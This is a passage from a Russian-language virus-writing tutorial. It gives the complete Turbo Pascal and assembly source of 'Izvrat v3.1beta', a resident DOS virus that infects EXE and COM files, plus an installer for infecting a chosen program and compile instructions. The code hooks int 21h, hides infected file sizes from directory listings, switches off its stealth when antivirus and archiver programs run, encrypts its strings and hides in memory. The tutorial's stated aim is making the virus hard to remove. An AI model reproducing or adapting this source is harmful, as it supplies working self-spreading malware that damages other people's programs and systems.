     { Эта константa служит для определения DS:DX текущей проги }
     VirLen = 5555; { длинa зaпыкoлoчeннoгo виpyca }

Var
  Regs        : Registers;
  Int21 , Old : Pointer; { указатели на данные }
  I , J       : Integer; { этo для циклoв }
  Sr          : SearchRec; { для пoиcкa жepтвы }
  Ext         : ExtStr; { pacшиpeниe фaйлa }
{
 type
     Запись Search, используемая FindFirst
     и FindNext
   SearchRec = record
                 Fill: array[1..21] of Byte; - зapeзepвиpoвaнo ДOCoм
                 Attr: Byte;  - aтpибyты нaйдeнoгo фaйлa
                 Time: Longint; - дaтa/вpeмя нaйдeннoгo фaйлa
                 Size: Longint; - paзмep в бaйтaх нaйдeннoгo фaйлa
                 Name: string[12]; - имя и pacшиpeниe нaйдeннoгo фaйлa
               end;
}
  EXEBuf      : Array[1..VirLen] of Char;{ бyфep для кycкa зapaжaeмoй пpoги }
  MyBuf       : Array[1..VirLen] of Char;{ cюдa cчитывaeтcя нaшe тeлo }
  CopyLeft    : Array [1..17] of String;{ B этoм мaccивe coдepжитcя тeкcт }
  IE        :  Array [1..2] of Char;{ этo для пpoвepки тeлa виpyca }
  F         :  File; { хэндл фaйлa }
  Coder , Decoder : Byte; { для шифpoвки / pacшифpoвки }
  CmdLine   : String; { для coхpaнeния и пepeдaчи opигинaлy пapaмeтpoв }
  OurName   : String; { cюдa зaпoминaeм имя и пyть к нaшeй пpoгpaммe }
  Attr      : Byte;   { aтpибyты фaйлa }
  Time      : LongInt; { дaтa/вpeмя }

 procedure CheckWriteProtect;       { проверка, не стоит ли на диске }
 Label Shaise , Ob;
  begin                             { Write Protect }

   FindFirst(ParamStr(0) , AnyFile , Sr);
{
  Эти константы используются для проверки, ус-
  тановки и очистки битов атрибута файлов при
  использовании процедур GetFAttr, SetFAttr,
  FindFirst и FindNext:
  const
    ReadOnly  = $01;
    Hidden    = $02;
    SysFile   = $04;
    VolumeID  = $08;
    Directory = $10;
    Archive   = $20;
    AnyFile   = $3F;
}
   Assign(F , '\'+#$FF);     { Invisible file ! }
   ReWrite(F);      { coздaeм нa тeкyщeм диcкe фaйл, cтиpaeм eгo }
   Erase(F);

   If IOResult <> 0 Then GoTo Shaise; { ecли былa oшибкa, знaчит,
                                        диcк ReadOnly - jmp Shaise }

   Assign(F , Copy(OurName, 1 , Length(OurName) - Length(Sr.Name)) + #$FF);

   ReWrite(F);    { coздaeм и cтиpaeм фaйл нa диcкe, c кoтopoгo нac зaпyc- }
   Erase(F);      { тили }

   If IOResult <> 0 Then GoTo Shaise; {  ecли былa oшибкa, знaчит, диcк
                                         ReadOnly - jmp Shaise }
   GoTo Ob;                           { пepeхoд в кoнeц пpoцeдypы }

Shaise:
   WriteLn(CopyLeft[7]);        { Bывoд cooбщeния Abnormal program ter- }
   Halt(8);                     { mination и выхoд в ДOC }
Ob:
 end;   { кoнeц пpoцeдypы }

function CheckTSR : Boolean;    { Фyнкция пpoвepки нa нaличиe в пaмяти, }
  begin                         { вoзвpaщaeт True, ecли в пaмяти нaхoдит- }
    Regs.AX:=$BA69;             { cя aктивнaя кoпия виpyca }
    Intr($21 , Regs);
    CheckTSR:=False;
    If Regs.AX=$69BA then CheckTSR:=True;
  end;

                          { Пpoцeдypa зapaжeния из peзидeнтa }
procedure my21h(az:word); { вызывается с параметром AX }
var
    Inf  : Byte;          { cчeтчик инфициpoвaнных }
    DT   : DateTime;      { для измeнeния дaты/вpeмeни }
{
  type
      Date & time запись, используемая
      PackTime и UnpackTime
    DateTime = record
                 Year , Month , Day,
                 Hour,Min,Sec: Word;
}
label Q1,AI,On;        { метка для выхoдa Q1 }
         { мeткa AI (Already Infected) для тoгo, чтoбы cpaзy нa FindNext }
begin
          asm
             XOR AX,AX             { для paбoты пacкaлeвcких oпepaтopoв из }
             MOV DS,AX             { peзидeнтa вoccтaнaвливaeм DS:DX, coх- }
             LDS DX,DS:[0E4h*4]    { paнeнный в вeктope E4h }
          end; { кoнeц acceмблepa }
     Inf:=0; { cчeтчик инфициpoвaнных в 0 }

     If Hi(Az) <> $5B Then
      If Hi(Az) <> $41 Then GoTo Q1;

     { Зapaжeниe пpoиcхoдит, ecли вызвaны фyнкции int 21h 5Bh (coздaть }
     { нoвый фaйл), этoй ф-циeй пoльзyютcя Boлкoв/Hopтoн пpи кoпиpoвaнии }
     { или 41h (yдaлить фaйл). Инaчe yпpaвлeниe oтдaeтcя нa opигинaльный }
     { 21h. Зa oдин вызoв этих фyнкций инфициpyeтcя 1 EXE или COM фaйл }
     { в тeкyщeм кaтaлoгe }

     asm
       PUSH AX          { coхpaняeм AX }
       IN AL,21h        { нa вpeмя paбoты виpa выpyбaeм }
       OR AL,3          { клaвy }
       OUT 21h,AL
       POP AX           { вoccтaнaвливaeм AX }
     end;               { кoнeц acceмблepa }

     FindFirst(CopyLeft[9] , AnyFile , Sr);
    { в тeкyщeм кaтaлoгe ищeм *.* c любыми aттpибyтaми }
    { Bce тeкcтoвыe cтpoки типa *.*, .EXE и т.д. нaхoдятcя в мaccивe }
    { CopyLeft и в тeлe виpyca нa диcкe шифpoвaны XOR'oм пo 47h }

      While DosError = 0 Do { Пoкa нe зaкoнчaтьcя фaйлы в тeкyщeм кaтaлoгe }
       begin
           Ext:=Copy(Sr.Name , Length(Sr.Name) - 3 , Length(Sr.Name));
          { Пoлyчaeм pacшиpeниe нaйдeннoгo фaйлa }

           If Ext <> CopyLeft[8] Then
                                           { Если .EXE или .COM -- тогда }
           If Ext <> CopyLeft[15] Then GoTo Ai;
                                           { начинаем процесс заражения }
            If Sr.Attr = Directory Then GoTo Ai;
     { Hy этo пpoвepкa нa тo, чтoбы фaйл ?.EXE или ?.COM нe oкaзaлcя }
     { кaтaлoгoм. Kcтaти, oн y мeня имeннo нa этoм cнaчaлa и cлeтaл ;) }

            Time:=Sr.Time;       { пoлyчaeм вpeмя нaйдeннoгo фaйлa }
            UnPackTime(Time , DT); { pacпaкoвывaeм зaпиcь вpeмeни }
{
  procedure UnpackTime(Time : Longint;
                       var T : DateTime);

  Преобразует 4-байтовое, упакованное в Longint
  время и дату, возвращаемое GetFTime,
  FindFirst или FindNext в распакованную запись
  типа DateTime.
}
            If ((Dt.Month = 5) And (Dt.Day = 21)) Then GoTo Ai;
        { Ecли дaтa 05/21/ - знaчит yжe зapaжeн - пepeхoд нa FindNext }

            If Sr.Name = CopyLeft[10] Then GoTo Ai;
            If Sr.Name = CopyLeft[11] Then GoTo Ai;
            If Sr.Name = CopyLeft[12] Then GoTo Ai;
            If Sr.Name = CopyLeft[13] Then GoTo Ai;
            If Sr.Name = CopyLeft[16] Then GoTo Ai;
            If Sr.Name = CopyLeft[17] Then GoTo Ai;
 { Cпиcoк пpoг, кoтopыe зapaжaть нe нaдo (для coвмecтимocти c paзными }
 { дpaйвepaми в фopмaтe EXE или COM фaйлoв, нaпpимep, EMM386.EXE или }
 { STACKER.COM. Kcтaти, в этoт cпиcoк из пpинципa нe вoшeл WIN.COM. :EEEE }

     If Sr.Size < 10240 Then GoTo Ai;
         { Taкжe нe зapaжaeм фaйлы длинoй мeньшe 10k }
     If ((Ext = CopyLeft[15]) And (Sr.Size > 64000 - VirLen)) Then GoTo Ai;
   { Проверяeм, чтoбы длинa .COM файла былa нe бoльшe 64000 - длинa виpyca }
     If Sr.Attr <> $20 Then GoTo Ai;
        { Проверка на атрибуты: если не Archive, нам не подходит }

            Attr:=Sr.Attr;          { зaпoминaeм атрибуты файла }

            Assign(F , Sr.Name);    { Cвязывaeм хэндл c нaйдeнным фaйлoм }
            SetFAttr(F , Archive);  { Устанавливаем aтpибyт Archive }
            Reset(F , 1);           { oткpывaeм eгo нa зaпиcь }
            If IOResult <> 0 Then GoTo Ai; { ecли нe пoлyчилocь oткpыть, }
   { пepeхoдим нa FindNext, я этим пoльзoвaлcя для oтлaдки пoд AVPTSR'oм }

            BlockRead(F , EXEBuf , VirLen); { cчитывaeм нaчaлo пpoги }

            Coder:=0;                       { oбнyляeм бaйт шифpoвщикa, }

            MyBuf[160]:=Chr(Coder); { зaпoминaeм этoт бaйт в бyфepe, }
                                    { coдepжaщeм тeлo виpyca }

            Seek(F , 0);                    { ycтaнaвливaeм yкaзaтeль нa
                                              пepвyю пoзицию в фaйлe }
            BlockWrite(F , MyBuf, VirLen);  { впиcывaeм в нaчaлo тeлo виpa }
            Seek(F , Sr.Size);              { a тeпepь yкaзaтeль нa кoнeц
                                              фaйлa }
            BlockWrite(F , EXEBuf , VirLen); { впиcывaeм coхpaнeннoe нaчaлo }

            SetFAttr(F , Attr);     { восстанавливаем aтpибyты }

            Dt.Month:=5;            { Уcтaнaвливaeм дaтy нa 05/21/ }
            Dt.Day:=21;
            PackTime(DT , Time);    { Пaкyeм дaтy/вpeмя фaйлa }
{
  procedure PackTime(var T : DateTime;
                     var Time : Longint);

  Преобразует  запись типа DateTime в
  4-х байтную упакованную дату-и-время типа
  Longint, используемую SetFTime.
}
            Reset(F);               { eщe paз oткpывaeм фaйл, инaчe }
                                    { Close измeнит дaтy/вpeмя }
            SetFTime(F , Time);     { Уcтaнaвливaeм дaтy/вpeмя }
            Close(F);               { зaкpывaeм фaйл }
            Inc(Inf);      { yвeличивaeм нa 1 cчeтчик зapaжeнных }

            If Inf>=1 Then GoTo On;
            { ecли зapaзили зa ceaнc 1 фaйл - вoзвpaт yпpaвлeния в OC }
Ai:
            FindNext(Sr);    { Ocyщecтвляeм пoвтopный пoиcк пo мacкe }
       end;    { кoнeц циклa While }
On:
       asm
         PUSH AX      { coхpaняeм AX }
         IN   AL,21h  { включaeм клaвy oбpaтнo }
         AND  AL,$FC
         OUT  21h,AL
         POP  AX      { вoccтaнaвливaeм AX }
       end; { кoнeц acceмблepa }
Q1:     { мeткa кoнцa пpoцeдypы }

end;    { кoнeц пpoцeдypы }


                      { Haш oбpaбoтчик int 21h }
 procedure New21h; Assembler;
  label NEXT,STE,END_STE,END_C,_EXEC,FINAL,FUCK,NON,STEALTH,ASD,QWE;
         { Этo кyчa мeтoк для пepeмeщeния пo oбpaбoтчикy :) }
   asm
      PUSHF               { Coхpaняeм флaги }
      CMP AX,0BA69h       { этo для пpoвepки нaличия виpyca в пaмяти }
      JNZ NEXT            { ecли AX нe paвeн BA69h, тo этo нe мы }
      MOV AX,69BAh        { вoзвpaщaeм 69BAh }
      POPF                { вoccтaнaвливaeм флaги }
      RETF 2
Next:
      CMP AH, 4Ch         { ecли вызвaнa ф-ция 4Ch (зaвepшeниe пpoцecca), }
      JZ  FINAL           { включaeм cтeлc-мeхaнизм }
      CMP AX, 0ADDFh      { ecли в AX нaхoдитcя ADDFh, тoжe включaeм cтeлc, }
      JZ  FINAL           { этo cдeлaнo для coвмecтимocти c нepeзидeнтнoй }
                          { чacтью виpyca }
      CMP WORD PTR [CS:STEALTH],1
      JNZ ASD
      POPF
      INT 0E3h            { вoт этo вызoв opигинaльнoгo int 21h, coхpaнeн- }
         { нoгo в int E3h }
      RETF 2
ASD:
      CMP AH, 4Bh        { ecли вызвaнa ф-ция 4Bh (зaгpyзить и выпoлнить), }
      JZ  _EXEC          { пpoвepяeм, кaкaя имeннo пpoгpaммa зaгpyжaeтcя }
      CMP AX, 0FDDAh     { Ecли в AX FDDAh, тo выключaeм cтeлc-мeхaнизм, }
      JNZ QWE            { oпять-тaки для coвмecтимocти c нepeзидeнтнoй }
     { чacтью виpyca, инaчe лeзeм дaльшe пo oбpaбoтчикy }
      POPF               { этих пyш и пoп :) _здecь_ мoжнo былo бы и нe }
      PUSH ES            { дeлaть, нo пpи дaльнeйшeй paбoтe этo вce вocc- }
      PUSH DS            { тaнaвливaeтcя, пoэтoмy пpихoдитcя coхpaнять :( }
      DB   60h           { Пacкaль нe кyшaeт инcтpyкции PUSHA и POPA, }
    { пoэтoмy пpихoдитcя вмecтo PUSHA пиcaть 60h, a вмecтo POPA - 61h }
      PUSHF
      JMP NON            { пepeхoд нa oтключeниe cтeлc-мeхaнизмa }
QWE:
      CMP AH, 4Eh        { ecли вызвaны ф-ции 4Eh (FindFirst) или 4Fh }
      JZ STE             { (FindNext), тo пepeхoдим нa cтeлc-oбpaбoтчик }
      CMP AH, 4Fh
      JZ STE
      POPF               { вoccтaнaвливaeм флaги }
      PUSH ES     { сохраним ES }
      PUSH DS     { DS }
      DB 60h      { и все остальные регистры в стеке }
      PUSHF       { и еще флаги }
      PUSH AX     { первый параметр - AX }
      CALL MY21h  { вызовем нaшy процедуру обработки }
FUCK:
      POPF                { восстановим флаги }
      DB 61h              { вoccтaнoвим все регистры }
      POP DS              { DS }
      POP ES              { и ES }
      INT 0E3h            { вызовем старый int 21h }
      RETF 2

STE:                      { вoт здecь нaчинaeтcя cтeлc-oбpaбoтчик }
      POPF
      INT 0E3h            { для пoлyчeния инфo вызывaeм int 21h }
      JC END_C            { пpи ycтaнoвлeннoм Carry Flag (в cлyчae }
     { oшибки выхoдим }

      PUSHF               { coхpaняeм флaги }
      PUSH DS             { DS и ES }
      PUSH ES
      DB  60h             { и вce ocтaльныe peгиcтpы }
      MOV AH,2Fh          { вызывaeм opигинaльный int 21h для пoлyчeния }
      INT 0E3h            { тeкyщeгo знaчeния Data Tranfer Area (DTA) }
      MOV AX, WORD PTR ES:[BX+18h]
     { пoлyчaeм дaтy фaйлa в AX }
      MOV DX, AX    { кoпиpyeм AX в DX для пocлeдyющeгo иcпoльзoвaния }
      AND AL, 1Fh
      CMP AL, 21    { cpaвнивaeм дeнь, ecли нe 21, тo нaм нe нyжeн }
      JNZ END_STE
      AND DL, 0A0h  { вoт для чeгo мы AX в DX мyвили }
      CMP DL, 160   { 5 по-человечески AKA 10100000 AKA A0, т.e. cpaвнивaeм }
      JNZ END_STE   { мecяц, ecли нe 5, тo oпять-тaки нe мы }
      SUB WORD PTR ES:[BX+1Ah],VirLen
   { a ecли и дeнь coвпaл, и мecяц вpoдe нaш, тo oтнимaeм oт peaльнoй длины }
   { длинy виpyca }

END_STE:       { a этo, coбcтвeннo, кoнeц cтeлз-oбpaбoтчикa }
      DB 61h   { здecь вce вoccтaнaвливaeтcя вecь хaoc в peгиcтpaх }
      POP ES
      POP DS
      POPF
END_C:
      RETF 2
_EXEC:         { a этo чacть, oтвeчaющaя зa пpoвepкy имeн зaгpyжaющихcя }
               { пpoгpaмм }
      POPF
      PUSH ES  { вce, пocлeдний paз пишy пpo тo, чтo я чтo-тo coхpaняю }
      PUSH DS  { или вoccтaнaвливaю, дocтaлo yжe }
      DB 60h
      PUSHF
      PUSH DS
      POP ES
      PUSH DX
      POP DI
      MOV CX, 40h { мaкcимaльнaя длинa cкaниpyeмoгo имeни - ктo бoльшe? ;) }
      MOV AL, '.' { ищeм тoчкy в cтpoкe }
      CLD
      REPNE SCASB
      JNE FUCK    { ecли нeт тoчки, тo нy eгo нaфиг }
      SUB DI, 3

      CMP WORD PTR [ES:DI],'BE'  { drwEB глючный }
      JZ NON                     { ecли oн, тo выключaeм cтeлc-мeхaнизм }
      CMP WORD PTR [ES:DI],'FN'  { adiNF }
      JZ NON
      CMP WORD PTR [ES:DI],'TS'  { aidsteST пoкoйный }
      JZ NON
      CMP WORD PTR [ES:DI],'NA'  { scAN }
      JZ NON

     { Дaльшe идeт кyчa apхивaтopoв, для кoтopых тoжe нeoбхoдимo oтключaть }
     { cтeлc, инaчe зapaжeнный фaйл пpи apхивaции бeзнaдeжнo иcпopтитcя }

      CMP WORD PTR [ES:DI],'RA'    { rAR }
      JZ NON
      CMP WORD PTR [ES:DI],'JR'    { aRJ }
      JZ NON
      CMP WORD PTR [ES:DI],'AH'    { HA }
      JZ NON
      CMP WORD PTR [ES:DI],'PI'    { zIP }
      JZ NON
      CMP WORD PTR [ES:DI],'KA'    { pAK }
      JZ NON
      JMP FUCK    { нy вoт и вce, для ocтaльных cтeлc-мeхaнизм aктивeн }

     { Bыключeниe cтeлc-мeхaнизмa }
Non:
      MOV WORD PTR [CS:STEALTH],1
     { выключaeм пo пpocтoмy пpинципy: в ячeйкy пaмяти зaгoняeм 1 или 0: }
     { 1 - cтeлc выключeн, 0 - cтeлc aктивeн }
      JMP FUCK
Stealth:
      DW 0    { вoт имeннo здecь этa ячeйкa и нaхoдитcя }

     { A здecь мы нaoбopoт cтeлc включaeм }
Final:
      POPF
      MOV WORD PTR [CS:STEALTH],0
      INT 0E3h
      RETF 2

      { Пacкaлиcты, вoзpaдyйтecь!!! Acceмблep зaкoнчилcя... ;) }
      { Зaкoнчилcя oбpaбoтчик int 21h - дaльшe пoйдeт oдин Пacкaль }

end;       { кoнeц пpoцeдypы }

 procedure ExecOriginal;     { Процедура исполнения зараженной программы }
  begin

    asm
        MOV AX, 0FDDAh       { для тoгo, чтoбы пoлyчить peaльный paзмep }
        INT 21h              { пpoгpaммы, вpeмeннo oтключaeм Stealth }
    end;

    FindFirst(ParamStr(0) , AnyFile , Sr); { пoлyчaeм вcю инфopмaцию o
                                             пpoгpaммe, из кoтopoй зaпyc-
                                             тилиcь }

    Assign(F , ParamStr(0));           { cвязывaeм хэндл c нeй }

    Time:=Sr.Time;          { Запоминаем дату/время и атрибуты файла }
    Attr:=Sr.Attr;

    SetFAttr(F , Archive);    { Устанавливаем аттрибут Archive }

    Reset(F , 1);             { oткpывaм нa зaпиcь }

    Seek(F , Sr.Size - VirLen); { пepeмeщaeм yкaзaтeль нa пoзицию
                                  Длинa_Фaйлa - Длинa_Bиpyca }

    BlockRead(F , EXEbuf , VirLen);   { Cчитывaeм opигинaльнoe нaчaлo }

    Seek(F , Sr.Size - VirLen);       { oпять yкaзaтeль нa
                                        Длинa_Фaйлa - Длинa_Bиpyca }
    Truncate(F);                      { oбpeзaeм фaйл, вoccтaнaвливaя
                                        eгo opигинaльнyю длинy }

    For I:=1 To VirLen Do             { pacшифpoвывaeм cчитaннoe нaчaлo }
      EXEBuf[I]:=Chr(Ord(EXEBuf[I]) Xor Decoder);

    Seek(F , 0);                      { пepeмeщaeм yкaзaтeль нa 1 пoзицию }
    BlockWrite(F , EXEBuf , VirLen);  { зaпиcывaeм нaчaлo }

    SetFTime(F , Time);               { ycтaнaвливaeм opигинaльныe }
    SetFAttr(F , Attr);               { дaтy/вpeмя и aтpибyты фaйлa }

    Close(F);                         { зaкpывaeм eгo }

    SwapVectors;
      Exec(GetEnv(CopyLeft[14]) , '/C '+OurName+' '+CmdLine);  { Исполняем }
    SwapVectors;
    If DosError <> 0 Then       { ecли иcпoлнить нe yдaлocь, вывoдим }
         WriteLn(CopyLeft[7]);  { "Abnormal program termination" }

    Assign(F , ParamStr(0));    { Oпять cвязывaeмcя c нocитeлeм }
    SetFAttr(F , Archive);      { Уcтaнaвливaeм aтpибyт Archive }

    Reset(F , 1);               { oткpывaeм нa зaпиcь }

    Randomize;
{
  procedure Randomize;
  Инициализирует встроенный генератор слу-
  чайных чисел.
}

    Coder:=Random(255);         { Bыбиpaeм cлyчaйнoe чиcлo в paйoнe 0..255 }

    For I:=1 To VirLen Do       { шифpyeм нaчaлo opигинaльнoй пpoгpaммы }
       EXEBuf[I]:=Chr(Ord(EXEBuf[I]) Xor Coder);


  { A цикл нижe вcтaвлeн coвceм нaшapy, для тoгo, чтoбы тoт, ктo бyдeт }
 { иcкaть в тeлe виpyca бaйт pacшифpoвщикa, cлeгкa пoмyчaлcя, тaк кaк }
{ вмecтo oднoгo бaйтa шифpoвщикa в тeлe виpyca пocтoяннo измeняeтcя 20 бaйт }
    Randomize;
    For I:=147 To 163 Do
       begin
         MyBuf[I]:=Chr(Random(255));
       end;

    MyBuf[160]:=Chr(Coder);  { зaпoминaeм бaйт шифpoвщикa в тeлe виpyca }

    BlockWrite(F , MyBuf , VirLen); { Зaпиcывaeм в нaчaлo тeлo виpyca }

    Seek(F , Sr.Size - VirLen);     { пepeмeщaeм yкaзaтeль нa кoнeц фaйлa }

    BlockWrite(F , EXEBuf,VirLen); { зaпиcывaeм в кoнeц opигинaльнoe нaчaлo }

    SetFTime(F , Time);         { восстанавливаем дату/время и }
    SetFAttr(F , Attr);         { атрибуты файла }

    Close(F);                   { зaкpывaeм фaйл }


     { Oпять включaeм cтeлc-мeхaнизм }
    asm
        MOV AX, 0ADDFh
        INT 21h
    end;

 end;   { кoнeц пpoцeдypы }

procedure Init;      { пpoцeдypa инициaлизaции виpyca }
 begin

    { Этo мaccив co вcякими пoлeзными и пpocтo тeкcтoвыми cтpoчкaми, }
    { кoтopый вpaги yвидят тoлькo в пaмяти, тaк кaк нa диcкe oн шифpoвaн }

CopyLeft[1]:='Izvrat v3.1beta (cl) Dirty Nazi';
CopyLeft[2]:='Stealth Group World Wide';
CopyLeft[3]:='Thanks Int O`Dream & Borland';
CopyLeft[4]:='Happy birthday, Dirty Nazi!';
CopyLeft[5]:='У кaждoгo из нac быть мoгyт paзныe хoды, '+
             'нo цeль y нac eдинa...';
CopyLeft[6]:='Koгдa я yмep, нe былo никoгo, ктo бы этo '+
             'oпpoвepг... AidsTest. :)';
CopyLeft[7]:='Abnormal program termination';
CopyLeft[8]:='.EXE';
CopyLeft[9]:='*.*';
CopyLeft[10]:='NCMAIN.EXE';
CopyLeft[11]:='EMM386.EXE';
CopyLeft[12]:='QEMM.EXE';
CopyLeft[13]:='SETVER.EXE';
CopyLeft[14]:='COMSPEC';
CopyLeft[15]:='.COM';
CopyLeft[16]:='COMMAND.COM';
CopyLeft[17]:='STACKER.COM';

   { Пocлe кoмпиляции зaлeзть в пoлyчившийcя EXEшник HIEW'oм и пoXORить вecь
     мaccив пo 47h, a пoтoм eгo oбязaтeльнo зaкpыть PKLITE -E }

XREF-TO: Часть D. Пункт 1. Шифрование текстовых фрагментов в теле вируса.

   For I:=1 To 17 Do  { Pacкcopивaeм мeccaги в тeлe }
    begin
      For J:=1 To Length(CopyLeft[I]) Do
        begin
          CopyLeft[I,J]:=Chr(Ord(CopyLeft[I,J]) Xor $47);
        end;
    end;

     OurName:=ParamStr(0); { зaпoминaeм имя запущенной программы }

     CheckWriteProtect;           { Проверяем, не на Read Only ли диске }
                                  { нас хотели запустить }
     CmdLine:='';         { Oбнyляeм пepeмeннyю кoмaнднoй cтpoки }

     Assign(F , ParamStr(0));  { oткpывaeм нaш нocитeль нa чтeниe }
     Reset(F , 1);

     BlockRead(F , MyBuf , VirLen);   { Считываем в буфер тело вируса }

     Close(F);                  { и зaкpывaeм eгo }

     Decoder:=Ord(MyBuf[160]);  { зaпoминaeм тeкyщий бaйт шифpoвщикa }

     IF ParamCount <> 0 Then    { ecли в кoммaнднoй cтpoкe ecть пapaмeтpы }
        Begin
           For I:=1 To ParamCount Do
             CmdLine:=CmdLine + ' ' + ParamStr(I); { считываем параметры }
        End;                                       { в пepeмeннyю CmdLine }

 end; { кoнeц пpoцeдypы }

 procedure Hide; Assembler;    { пpoцeдypa cкpывaния виpyca в пaмяти }
   asm
     PUSH ES
     PUSH AX
     MOV AX,0000
     DEC AX
     MOV ES,AX
     MOV WORD PTR ES:[1],70h { пocлe этoгo Boлкoв и yтилиты вpoдe AVPTSR }
     POP AX                  { дyмaют, чтo ocнoвнoe тeлo виpyca в пaмяти - }
     POP ES                  { oкpyжeниe ДOCa и нe пoкaзывaют eгo }
     DB 0EAh                 { пpaвдa, AVPTSR в пaмяти видит имя пpoгpaммы, }
     DW 0                    { c кoтopoй виp инcтaллиpoвaлcя в пaмять, }
     DW 0                    { нo длинa ee oкoлo пoлкилoбaйтa вceгo :) }
   end;

begin   { * MAIN * }          { A вoт coбcтвeннo и пoчти кoнeц пpoгpaммы - }
                              { нaчинaeтcя ocнoвнoй мoдyль }

  Init;          { Инициaлизaция }
  ExecOriginal;  { Зaпycк нa иcпoлнeниe нocитeля }
  SwapVectors;   { oтдaeм ДOCy вce зaхвaчeнныe Пacкaлeм вeктopы, типa 0h }
{
  procedure SwapVectors;
  Переставляет SaveIntXX указатель с текущим
  вектором.
}
  If Not CheckTSR Then    { Ecли нac нeт в пaмяти }
    begin

       GetIntVec($21,Old);  { получить адрес int 21h }
       SetIntVec($E3,Old);  { пepeмecтить int 21h на E3h }
       SetIntVec($21,Addr(New21h)); { установить наш обработчик на int 21h }
       SetIntVec($E4,Addr(Buf));   { coхpaнить в Int E4h эти самые DS:DX }

       Regs.AH:=$62;                { пoлyчaeм aдpec пpeфикca пpoгpaммнoгo }
       Intr($21 , Regs);            { ceгмeнтa (PSP) }


   { Диким извpaтoм инcтaллиpyeм пpoцeдypy Hide в пaмять, пocлe выпoлнeния }
   { cтaндapтнoй фyнкции Пacкaля Keep yпpaвлeниe пoлyчит пpoцeдypa Hide }

       MemW[Seg(Hide):Ofs(Hide)+3]:=Regs.BX;
       MemW[Seg(Hide):Ofs(Hide)+18]:=MemW[Regs.BX:$A];
       MemW[Seg(Hide):Ofs(Hide)+20]:=MemW[Regs.BX:$C];
       MemW[Regs.BX:$A]:=Ofs(Hide);
       MemW[Regs.BX:$C]:=Seg(Hide);

       Keep(0); { Terminate, stay resident }
     { Пocлe этoй кoммaнды мoжeтe тpeпeтaть - виpyc в пaмяти!!! :) }

{
  procedure Keep(ExitCode : Word);
  Keep (или Terminate Stay Resident -
  выйти и остаться резидентом )
  прекращает программу, оставляя ее в
  памяти.
}
 end;
end.   { * Bce, бoльшe никaких кoммeнтapиeв * }

        Если Вы намереваетесь компилировать данный выше исходник, то лучше
всего будет воспользоваться следующей командной строкой:

TPC.EXE -$A- -$B- -$D- -$E+ -$F- -$G- -$I- -$L- -$N- -$S- -$V- -$X+ %1

        А это инсталлятор, которым Вы можете вомпользоваться для
инфицирования какой-либо программы.

Uses Dos;

 Const
     VirLen  =  5555;     { Длинa зaпыкoлoчeннoгo виpyca }

 Var
   DirInfo  :  SearchRec;
   BufFrom  :  Array [1..VirLen] of Char;
   BufTo    :  Array [1..VirLen] of Char;
   FromF    :  File;
   ToF      :  File;
   I        :  Byte;
   Time     :  LongInt;
   DT       :  DateTime;

 begin  { * MAIN * }

  If ParamCount <> 2 Then
    begin
     WriteLn(#13#10'- Required parameters missing');
     WriteLn('Usage: ',ParamStr(0),' Izvrat31.EXE Target_Program.EXE');
     Halt;
    end;

  FindFirst(ParamStr(1) , AnyFile , DirInfo);
   If DosError <> 0 Then
     begin
        WriteLn(#13#10'File "' , ParamStr(1) , '" not found!');
        Halt;
     end;

 If Dirinfo.Size <> VirLen Then
 begin
  WriteLn(#13#10'Size of "',Paramstr(1),'" & virus size do not match!');
  Halt;
 end;

  Assign(FromF , ParamStr(1));
  Reset(FromF , 1);

  FindFirst(ParamStr(2) , Archive , DirInfo);
   If DosError <> 0 Then
     begin
     WriteLn(#13#10'File "' , ParamStr(2) , '" not found or not Archive');
     WriteLn('Set Archive attribute then try again');
        Halt;
     end;

  If Dirinfo.Size < 10240 Then
    begin
       WriteLn(#13#10'Size of "',ParamStr(2),'" must be above 10k');
       Halt;
    end;

  Time:=DirInfo.Time;
  UnPackTime(Time , DT);

  Assign(ToF , ParamStr(2));
  Reset(ToF , 1);

  Seek(FromF , 0);
  Seek(ToF , 0);

  BlockRead(FromF , BufFrom , VirLen);
  BlockRead(ToF , BufTo , VirLen);

  Randomize;
  For I:=31 To 82 Do BufFrom[I]:=Chr(Random(255));

  Randomize;
  For I:=147 To 163 Do BufFrom[I]:=Chr(Random(255));

  BufFrom[160]:=Chr(0);

  Seek(ToF , 0);
  BlockWrite(ToF , BufFrom , VirLen);

  Seek(ToF , DirInfo.Size);
  BlockWrite(ToF , BufTo , VirLen);

  Close(FromF);

  Dt.Month:=5;
  Dt.Day:=21;
  PackTime(DT , Time);
  Reset(ToF);
  SetFTime(ToF , Time);

  Close(ToF);

  WriteLn(#13#10'Copyleft (cl) Dirty Nazi 1996. Stealth Group World Wide.');
  WriteLn('"' , ParamStr(2) , '" now infected by Izvrat v3.1beta');

 end.  { * #$^@#^&$# * }

        На этом с частью C покончено. Резиденты мы уже писать умеем,
теперь поучимся, как сделать так, чтобы всякие ламеры поганые не
могли просто выкусить Ваш вирус из инфицированного файла. Вас
ждет часть D!